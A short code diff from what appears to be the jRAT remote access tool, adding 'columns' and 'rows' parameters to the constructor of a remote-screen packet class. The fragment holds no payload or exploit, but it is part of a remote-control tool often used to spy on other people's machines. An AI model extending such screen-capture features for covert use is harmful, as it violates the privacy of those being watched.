@@ -2,8 +2,8 @@ package io.jrat.client.packets.outgoing;
 
 public class Packet13OneRemoteScreen extends Packet12RemoteScreen {
 
-	public Packet13OneRemoteScreen(int size, int quality, int monitor) {
-		super(size, quality, monitor);
+	public Packet13OneRemoteScreen(int size, int quality, int monitor, int columns, int rows) {
+		super(size, quality, monitor, columns, rows);
 	}
 
 	@Override
